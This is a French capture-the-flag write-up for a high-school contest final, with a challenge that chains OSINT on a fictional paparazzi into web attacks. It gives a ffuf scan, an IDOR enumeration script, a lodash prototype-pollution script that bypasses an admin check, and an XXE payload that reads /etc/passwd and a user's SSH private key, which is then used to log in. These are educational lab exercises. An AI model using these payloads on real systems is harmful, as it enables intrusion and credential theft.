# Chall Finale NBCTF


## Préambule

Ce challenge est destiné aux lycéens qualifiés pour la finale du NBCTF.

## Informations sur le challenge 
- **Titre** : Un paparazzi négligeant
- **Type** : OSINT, WEB
- **Difficulté** : Difficile
- **Nombre de points** : 500 
- **Enoncé** : "Vous êtes engagé par une superstar afin de retrouver le paparazzi **anglais** qui ne cesse de l'importuner. Il semblerait que son dernier scoop concerne **Ben Affleck, Ana de Armas et leur chien**"

---

## Résolution

### Partie OSINT 

Avec les informations fournises dans l'énoncé : 
- Ana de Armas
- Ben Affleck
- Chien 
- Paparazzi anglais

on peut faire une recherche sur Twitter, tel que : 
> https://twitter.com/search?q=%22Ben%20Affleck%22%20%22Ana%20de%20Armas%22%20%22dog%22

En se rendant dans la partie `latest`, on trouve un Tweet : 

![image](https://hackmd.io/_uploads/SkLzSTxVp.png)


Le compte à l'origine du Tweet est : 
> serafincezary56 

En regardant rapidement son compte, on trouve plusieurs informations pertinentes : 

- Un compte Instagram : `serafin_cezary_pro`
- Une adresse mail : `serafin.cezary.pro@gmail.com`

Un potentiel hack de son compte Instagram : 

![image](https://hackmd.io/_uploads/B1g4l8peVa.png)

et un screen du jeu Grépolis : 

![image](https://hackmd.io/_uploads/SkOfIpl4p.png)

- Un pseudo : `Scezary56`

#### Compte Instagram

Sans plus d'informations, on peut faire une recherche sur les éléments trouvés : 

Le compte Instagram est bien supprimé : 

![image](https://hackmd.io/_uploads/SJokPTxV6.png)

La page du profil ne semble pas archivée sur : 

> https://web.archive.org/web/20230000000000*/https://www.instagram.com/serafin_cezary_pro


#### Adresse mail 

Dans la bio du compte Twitter, on retrouve une adresse mail : 
> serafin.cezary.pro@gmail.com

On va utiliser l'outil `holehe` pour trouver les comptes liés à cette adresse : 
> https://github.com/megadose/holehe

On lance l'outil tel que : 
```
holehe --only-used serafin.cezary.pro@gmail.com

**********************************
   serafin.cezary.pro@gmail.com
**********************************
[+] archive.org
[+] twitter.com

[+] Email used, [-] Email not used, [x] Rate limit
121 websites checked in 3.88 seconds
```

On trouve donc : 
- Le compte Twitter déjà connu. 
- Un compte archive.org qui semble cohérent avec le Tweet concernant le hack du compte.


#### Archive

On peut analyser le code source de holehe pour comprendre comment le programme trouve le compte. 

Sous 
> https://github.com/megadose/holehe/blob/master/holehe/modules/software/archive.py

```py
async def archive(email, client, out):
    name = "archive"
    domain = "archive.org"
    method = "register"
    frequent_rate_limit=False

    headers = {
        'User-Agent': random.choice(ua["browsers"]["chrome"]),
        'Accept': '*/*',
        'Accept-Language': 'en,en-US;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------',
        'Origin': 'https://archive.org',
        'Connection': 'keep-alive',
        'Referer': 'https://archive.org/account/signup',
        'Sec-GPC': '1',
        'TE': 'Trailers',
    }
``` 

On comprend que le programme essaie de créer un nouveau compte avec l'adresse mail. Si l'inscription échoue, alors le compte existe. 

Impossible de trouver le compte correspondant avec l'adresse mail. 
En se créant un compte sur la plateforme, on comprend que : 

> https://archive.org/details/@XXX

permet d'accèder au compte dédié. 

Or, on a trouvé le pseudo du paparazzi sur le Tweet de Grepolis. 

Testons donc : https://archive.org/details/@scezary56

![image](https://hackmd.io/_uploads/rytiK6gEp.png)

Le compte possède 2 uploads publics. 

On télécharge les 2 pages HTML, en ouvrant la première on obtient : 

![image](https://hackmd.io/_uploads/SyVM9Tg4T.png)

qui correspond bien à une backup du compte Instagram. On retrouve un lien vers son blog : 

> http://cezary-the-paparazzi.fr


### Partie WEB

#### Directory Listing

On arrive donc sur la page Web du paparazzi : 


![image](https://hackmd.io/_uploads/HkFliTeEa.png)

On ne trouve pas d'informations réellement utiles sur cette page vitrine. 
On va donc essayer de `ffuf` le site pour trouver des informations supplémentaires : 


```
$ ffuf -u http://cezary-the-paparazzi.fr/FUZZ -w SecLists/Discovery/Web-Content/big.txt -fs 23 -X GET

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://cezary-the-paparazzi.fr/FUZZ
 :: Wordlist         : FUZZ: SecLists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 23
________________________________________________

nextstep                [Status: 200, Size: 1062, Words: 461, Lines: 46]
```

On trouve une page nommée `nextstep`. On peut s'y rendre pour voir son contenu : 

![image](https://hackmd.io/_uploads/SJ29JAgEp.png)


#### IDOR

Le site semble être utilisé pour gérer des tâches. 
En cliquant sur `Go back in safe place` on est redirigé vers : 

> /nextstep?task=356a192b7913b04c54574d18c28d46e6395428abg

![image](https://hackmd.io/_uploads/SyL4xCg46.png)

Cependant, il semble impossible de deviner les autres tâches. 

En analysant le `hash` :

> 356a192b7913b04c54574d18c28d46e6395428abg

On trouve qu'il fait une longueur de 41. 

On peut se rendre sur : https://fr.wikipedia.org/wiki/Liste_de_fonctions_de_hachage pour obtenir des informations complémentaires sur le type de hash et s'il est connu.


On trouve que SHA-1 est codé sur 160 bits, soit **40** caractères. 1 caractère semble être de trop. 

Si on observe le contenu du hash de notre URL. On peut voir que le dernier caractère est un `G`. Or ce n'est pas possible dans un hash de ce type. 
La lettre la plus "haute" étant `F`.

> 356a192b7913b04c54574d18c28d46e6395428ab

Avec `hashcat` on tente maintenant de cracker ce hash : 


```
student@Linux-Hector:~$ echo "356a192b7913b04c54574d18c28d46e6395428ab" > hashIDOR.txt && hashcat -m 100 -a 0 hashIDOR.txt ~/Téléchargements/rockyou.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 14830/29724 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /home/student/Téléchargements/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

356a192b7913b04c54574d18c28d46e6395428ab:1
```

On trouve instantanément que `356a192b7913b04c54574d18c28d46e6395428ab <-> 1`

--- 

Parfait, on peut maintenant essayer de trouver la note n°2 : 

```
echo -n "2" | sha1sum | awk '{print $1"g"}'
da4b9237bacccdf19c0760cab7aec4a8359010b0g
```


![image](https://hackmd.io/_uploads/r1igmAgV6.png)

Pour gagner du temps on va créer un script python et laisser tourner : 

```python
import requests
import hashlib

url = 'http://localhost:4444/nextstep?task='

for i in range(100):
    hashed = hashlib.sha1(str(i).encode('utf-8')).hexdigest() + 'g'
    response = requests.get(url + hashed)
    if 'Not Found' not in response.text:
        print("Task n° "+str(i) + " " + hashed)
```

On trouve : 
```
Task n° 1 356a192b7913b04c54574d18c28d46e6395428abg
Task n° 2 da4b9237bacccdf19c0760cab7aec4a8359010b0g
Task n° 3 77de68daecd823babbb58edb1c8e14d7106e83bbg
Task n° 4 1b6453892473a467d07372d45eb05abc2031647ag
Task n° 91 4cd66dfabbd964f8c6c4414b07cdb45dae692e19g
```

La note **91** semble pertinente. Allons voir : 

![image](https://hackmd.io/_uploads/rkODS0g46.png)

avec le contenu : 
```
Update the version of 'lodash' in my project under /FeedBackEndpointTest
```

#### Prototype Pollution Bypass


on trouve donc une nouvelle route vers /FeedBackEndpointTest. 

Seulement la page semble être accessible uniquement par **'SuperAdminForSuperWebSite__'**

La tâche fait également référence à `lodash` et un status `urgent`. 

Bizarre, regardons s'il existe des vulnérabilités dessus : 

![image](https://hackmd.io/_uploads/HJexPRl4T.png)

Il existe beaucoup de vulnérabilités. Mais une prototype pollution semble plus probable dans notre cas. (Bypass de check).

> CVE-2018-16487 : A prototype pollution vulnerability was found in lodash <4.17.11 where the functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of Object.prototype.


Avec une request CURL : 


```
curl -X OPTIONS http://localhost:4444/FeedBackEndpointTest && echo ''
POST,GET,HEAD
```

On peut voir que l'endpoint accepte des requêtes POST et GET. 

On va donc créer une variable "globale" SuperAdminForSuperWebSite__ en utilisant le principe du prototype pollution. 
Voici le payload : 

```json
{
        "Object": {
            "prototype": {
                "__proto__": {
                    "SuperAdminForSuperWebSite__": True
                }
            }
        
    }
}
```

On effectue donc une première requête POST vers l'endpoint puis une requête GET : 

```py
import requests

payload = {
        "Object": {
            "prototype": {
                "__proto__": {
                    "SuperAdminForSuperWebSite__": True
                }
            }
        
    }
}

def exploit(host, payload):
    url = host + '/FeedBackEndpointTest'
    
    print( requests.get(url) )
    print( requests.post(url, json=payload))

if __name__ == '__main__':
    exploit('http://localhost:4444', payload)
```

On tente d'accèder à la page avec un GET, etttt : 


![image](https://hackmd.io/_uploads/Bkk8Y0g4T.png)

#### Faille XXE

Lorsque l'on clique sur "Send", la requête POST est envoyée et une alerte apparait : 

![image](https://hackmd.io/_uploads/rkxuUag4T.png)

Il semble que la valeur du champ `Email address` soit intégré au message de l'alerte.

Analysons la requête POST avec Burp : 

![image](https://hackmd.io/_uploads/SJ70UaeVa.png)

La requête envoie le contenu du formulaire au format XML.
Nous pensons alors à une faille XXE (XML External Entity).

Tentons alors de lire le fichier `/etc/passwd` du serveur avec le payload suivant : 
```xml
<?xml version = "1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd">]>
<contact><name>a</name><subject>c</subject><mail>&xxe;</mail><message>d</message></contact>
```

En renvoyant la requête avec notre payload : 

![image](https://hackmd.io/_uploads/Skr6hTlVa.png)

On peut bel et bien lire le fichier.

--> On poursuit sur le .ssh/id_rsa

#### Connexion via SSH

On peut tenter d'obtenir la clef privée de Serafin. 
De manière générale, les clefs privées sont stockées dans le répertoire `/home/<username>/.ssh/`. 
De plus, le nom par défaut d'une clef privée est `id_rsa`. 

Ainsi, essayons de lire le fichier `/home/serafin/.ssh/id_rsa` : 

![image](https://hackmd.io/_uploads/BJJPSAxNp.png)

Copions la clef de Serafin dans un fichier sur notre machine et connectons nous à la machine de Serafin grâce à elle : `ssh serafin@<ip-address> -i id_rsa`

